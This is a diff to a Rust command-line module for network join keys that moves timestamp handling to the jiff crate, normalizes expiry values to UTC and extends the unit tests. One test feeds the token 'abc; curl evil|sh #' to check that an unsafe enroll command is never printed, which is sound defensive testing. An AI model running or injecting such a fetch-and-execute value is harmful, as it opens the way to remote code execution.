@@ -4,7 +4,11 @@
 //! The token (`dnjoin-<id>-<secret>`) is returned by the create call only;
 //! every other read leaves it out.
 
+use std::str::FromStr;
+
 use anyhow::{Context, anyhow, bail};
+use jiff::tz::TimeZone;
+use jiff::{Span, Timestamp};
 use serde_json::{Value, json};
 
 use super::delete::{DeleteTarget, Described, confirm_and_delete};
@@ -16,7 +20,6 @@ use crate::output::{
     OutputMode, data_object, joined_field, print_list, render_details, sanitize_for_display,
     str_field,
 };
-use crate::rfc3339;
 
 /// The name rules `POST /v1/join-keys` enforces: a DNS label of at most 54
 /// characters. Hosts that enroll without a usable hostname are named after
@@ -25,7 +28,7 @@ const MAX_NAME_CHARS: usize = 54;
 
 pub fn join_keys_list(client: &Client, page: &PageArgs, output: OutputMode) -> anyhow::Result<()> {
     let headers = ["ID", "NAME", "NETWORK", "ROLE", "TAGS", "CIDRS", "EXPIRES"];
-    let now = rfc3339::now();
+    let now = Timestamp::now();
     print_list(
         &client.list_join_keys(page)?,
         output,
@@ -133,7 +136,7 @@ pub fn join_keys_create(
     let res = client.create_join_key(&body)?;
     output.emit(&res, |res| {
         let data = data_object(res, "join key")?;
-        print!("{}", render_created(data, rfc3339::now()));
+        print!("{}", render_created(data, Timestamp::now()));
         Ok(())
     })
 }
@@ -182,7 +185,7 @@ pub fn join_keys_delete(
             let data = &client.get_join_key(id)?["data"];
             Ok(Described {
                 name: sanitize_for_display(str_field(data, "name")),
-                detail: match expires_text(data, rfc3339::now()).as_str() {
+                detail: match expires_text(data, Timestamp::now()).as_str() {
                     "" => String::new(),
                     "never" => "never expires".to_string(),
                     when => format!("expires {when}"),
@@ -238,24 +241,42 @@ fn build_edit_body(args: &JoinKeyEditArgs) -> anyhow::Result<Value> {
 }
 
 /// The `expiresAt` to send for `--expires-at` / `--expires-in`, or `None`
-/// when neither was given. A timestamp is checked for shape and must be in
-/// the future, as the API requires; a duration is added to the clock now.
+/// when neither was given, as an RFC 3339 UTC timestamp. A timestamp may
+/// carry any UTC offset and is normalized; a duration is added to the clock
+/// now, in UTC, so a day is always 24 hours. Both must land in the future,
+/// as the API requires.
 fn expiry(at: Option<&str>, after: Option<&str>) -> anyhow::Result<Option<String>> {
-    let now = rfc3339::now();
-    if let Some(at) = at {
-        let at = at.trim();
-        let secs = rfc3339::parse(at).map_err(|e| anyhow!("--expires-at: {e}"))?;
-        if secs <= now {
+    let now = Timestamp::now();
+    let when = if let Some(at) = at {
+        let when = Timestamp::from_str(at.trim()).map_err(|e| {
+            anyhow!("--expires-at: expected an RFC 3339 timestamp like 2027-01-01T00:00:00Z ({e})")
+        })?;
+        if when <= now {
             bail!("--expires-at: must be in the future");
         }
-        return Ok(Some(at.to_string()));
-    }
-    if let Some(after) = after {
-        let secs = rfc3339::parse_duration(after).map_err(|e| anyhow!("--expires-in: {e}"))?;
-        let secs = i64::try_from(secs).map_err(|_| anyhow!("--expires-in: too long"))?;
-        return Ok(Some(rfc3339::format(now + secs)));
-    }
-    Ok(None)
+        when
+    } else if let Some(after) = after {
+        let span = Span::from_str(after.trim()).map_err(|e| {
+            anyhow!("--expires-in: expected a duration such as 30m, 12h, 7d, or 1y ({e})")
+        })?;
+        let when = now
+            .to_zoned(TimeZone::UTC)
+            .checked_add(span)
+            .map_err(|e| anyhow!("--expires-in: {e}"))?
+            .timestamp();
+        if when <= now {
+            bail!("--expires-in: must be longer than 0 seconds");
+        }
+        when
+    } else {
+        return Ok(None);
+    };
+    Ok(Some(format_utc(when)))
+}
+
+/// `when` as the API writes timestamps: whole seconds, UTC, `Z` suffix.
+fn format_utc(when: Timestamp) -> String {
+    when.strftime("%Y-%m-%dT%H:%M:%SZ").to_string()
 }
 
 /// A key name as the API accepts it: lowercase letters, digits, and hyphens,
@@ -308,7 +329,7 @@ fn key_role_name(client: &Client, data: &Value) -> Option<String> {
 }
 
 /// The columns of the human join key table.
-fn join_key_row(row: &Value, now: i64) -> Vec<String> {
+fn join_key_row(row: &Value, now: Timestamp) -> Vec<String> {
     vec![
         str_field(row, "id").to_string(),
         str_field(row, "name").to_string(),
@@ -325,11 +346,11 @@ fn join_key_row(row: &Value, now: i64) -> Vec<String> {
 
 /// `expiresAt` for a person: `never` for `null`, the timestamp otherwise,
 /// marked `(expired)` once it has passed. Empty when the field is absent.
-fn expires_text(data: &Value, now: i64) -> String {
+fn expires_text(data: &Value, now: Timestamp) -> String {
     match data.get("expiresAt") {
         Some(Value::Null) => "never".to_string(),
-        Some(Value::String(at)) => match rfc3339::parse(at) {
-            Ok(secs) if secs <= now => format!("{at} (expired)"),
+        Some(Value::String(at)) => match Timestamp::from_str(at) {
+            Ok(when) if when <= now => format!("{at} (expired)"),
             _ => at.clone(),
         },
         _ => String::new(),
@@ -345,11 +366,11 @@ fn render_join_key(data: &Value, role_name: Option<&str>) -> String {
         "" => format!("{}\n", sanitize_for_display(id)),
         shown => format!("{shown}\n"),
     };
-    out.push_str(&details(data, role_name, rfc3339::now()));
+    out.push_str(&details(data, role_name, Timestamp::now()));
     out
 }
 
-fn details(data: &Value, role_name: Option<&str>, now: i64) -> String {
+fn details(data: &Value, role_name: Option<&str>, now: Timestamp) -> String {
     let role = match (data["roleID"].as_str().filter(|r| !r.is_empty()), role_name) {
         (Some(id), Some(name)) => format!("{name} ({id})"),
         (Some(id), None) => id.to_string(),
@@ -372,7 +393,7 @@ fn details(data: &Value, role_name: Option<&str>, now: i64) -> String {
 /// goes into a line the user pastes into a shell, so it is printed only when
 /// it looks like one the API issues; the key exists either way, so a bad one
 /// is reported with the way to replace it rather than as an error.
-fn render_created(data: &Value, now: i64) -> String {
+fn render_created(data: &Value, now: Timestamp) -> String {
     let id = sanitize_for_display(str_field(data, "id"));
     let name = sanitize_for_display(str_field(data, "name"));
     let mut out = match name.trim() {
@@ -421,7 +442,9 @@ mod tests {
     const TOKEN: &str =
         "dnjoin-P3RCTXN5LVFGBMJNYF2QHKWDOA-6YQKZ3VNB2XGJ4MEPLRT7WCSAHDUF5IO3QXBKZNYV2MJ4RLEHGTA";
     /// 2027-01-01T00:00:00Z.
-    const NOW: i64 = 1_798_761_600;
+    fn now() -> Timestamp {
+        Timestamp::from_second(1_798_761_600).unwrap()
+    }
 
     fn create_args(name: &str) -> JoinKeyCreateArgs {
         JoinKeyCreateArgs {
@@ -650,30 +673,83 @@ mod tests {
             .as_str()
             .unwrap()
             .to_string();
-        let secs = rfc3339::parse(&at).unwrap();
-        assert!((secs - rfc3339::now() - 3600).abs() < 60, "{at}");
+        let when = Timestamp::from_str(&at).unwrap();
+        let drift = when.as_second() - Timestamp::now().as_second() - 3600;
+        assert!(drift.abs() < 60, "{at}");
+        assert!(at.ends_with('Z') && at.len() == 20, "{at}");
+    }
+
+    #[test]
+    fn expiry_normalizes_offsets_to_utc_and_adds_durations_in_utc() {
+        assert_eq!(
+            expiry(Some("2099-01-01T02:00:00+02:00"), None)
+                .unwrap()
+                .as_deref(),
+            Some("2099-01-01T00:00:00Z")
+        );
+        assert_eq!(
+            expiry(Some(" 2099-01-01t00:00:00.5z "), None)
+                .unwrap()
+                .as_deref(),
+            Some("2099-01-01T00:00:00Z")
+        );
+        assert_eq!(expiry(None, None).unwrap(), None);
+        for ok in [
+            "30m", "12h", "7d", "30d", "90d", "365d", "1d12h", "1d 12h", "2w", "1y", "1.5h",
+        ] {
+            let at = expiry(None, Some(ok)).unwrap().unwrap();
+            assert!(
+                Timestamp::from_str(&at).unwrap() > Timestamp::now(),
+                "{ok}: {at}"
+            );
+        }
+        for (at, after, want) in [
+            (Some("tomorrow"), None, "--expires-at: expected an RFC 3339"),
+            (
+                Some("2027-02-29T00:00:00Z"),
+                None,
+                "--expires-at: expected an RFC 3339",
+            ),
+            (
+                Some("2027-01-01"),
+                None,
+                "--expires-at: expected an RFC 3339",
+            ),
+            (
+                Some("2020-01-01T00:00:00Z"),
+                None,
+                "--expires-at: must be in the future",
+            ),
+            (None, Some("7"), "--expires-in: expected a duration"),
+            (None, Some("7x"), "--expires-in: expected a duration"),
+            (None, Some("0h"), "--expires-in: must be longer than 0"),
+            (None, Some("-1d"), "--expires-in: must be longer than 0"),
+        ] {
+            let err = expiry(at, after).unwrap_err().to_string();
+            assert!(err.contains(want), "{at:?} {after:?}: {err}");
+        }
     }
 
     #[test]
     fn expires_text_marks_null_and_the_past() {
-        assert_eq!(expires_text(&json!({"expiresAt": null}), NOW), "never");
+        assert_eq!(expires_text(&json!({"expiresAt": null}), now()), "never");
         assert_eq!(
-            expires_text(&json!({"expiresAt": "2099-01-01T00:00:00Z"}), NOW),
+            expires_text(&json!({"expiresAt": "2099-01-01T00:00:00Z"}), now()),
             "2099-01-01T00:00:00Z"
         );
         assert_eq!(
-            expires_text(&json!({"expiresAt": "2026-12-31T23:59:59Z"}), NOW),
+            expires_text(&json!({"expiresAt": "2026-12-31T23:59:59Z"}), now()),
             "2026-12-31T23:59:59Z (expired)"
         );
         // An unparseable value is shown as-is rather than guessed at.
-        assert_eq!(expires_text(&json!({"expiresAt": "soon"}), NOW), "soon");
-        assert_eq!(expires_text(&json!({}), NOW), "");
+        assert_eq!(expires_text(&json!({"expiresAt": "soon"}), now()), "soon");
+        assert_eq!(expires_text(&json!({}), now()), "");
     }
 
     #[test]
     fn row_shows_the_default_role_and_joins_lists() {
         assert_eq!(
-            join_key_row(&key(), NOW),
+            join_key_row(&key(), now()),
             [
                 ID,
                 "ci-runner",
@@ -687,7 +763,7 @@ mod tests {
         let mut k = key();
         k["roleID"] = Value::Null;
         k["expiresAt"] = Value::Null;
-        let row = join_key_row(&k, NOW);
+        let row = join_key_row(&k, now());
         assert_eq!(row[3], "default");
         assert_eq!(row[6], "never");
     }
@@ -729,7 +805,7 @@ mod tests {
     fn created_prints_the_enroll_command_once_only_warning_and_role_note() {
         let mut k = key();
         k["token"] = json!(TOKEN);
-        let out = render_created(&k, NOW);
+        let out = render_created(&k, now());
         assert!(
             out.starts_with(&format!("Created join key \"ci-runner\" ({ID})\n")),
             "{out}"
@@ -742,7 +818,7 @@ mod tests {
         assert!(!out.contains("default role denies"), "{out}");
 
         k["roleID"] = Value::Null;
-        let out = render_created(&k, NOW);
+        let out = render_created(&k, now());
         assert!(out.contains("default role denies"), "{out}");
     }
 
@@ -751,7 +827,7 @@ mod tests {
         for token in [json!(null), json!(""), json!("abc; curl evil|sh #")] {
             let mut k = key();
             k["token"] = token;
-            let out = render_created(&k, NOW);
+            let out = render_created(&k, now());
             assert!(!out.contains("dnclient enroll"), "{out}");
             assert!(!out.contains("curl"), "{out}");
             assert!(out.contains(&format!("dn join-key delete {ID}")), "{out}");
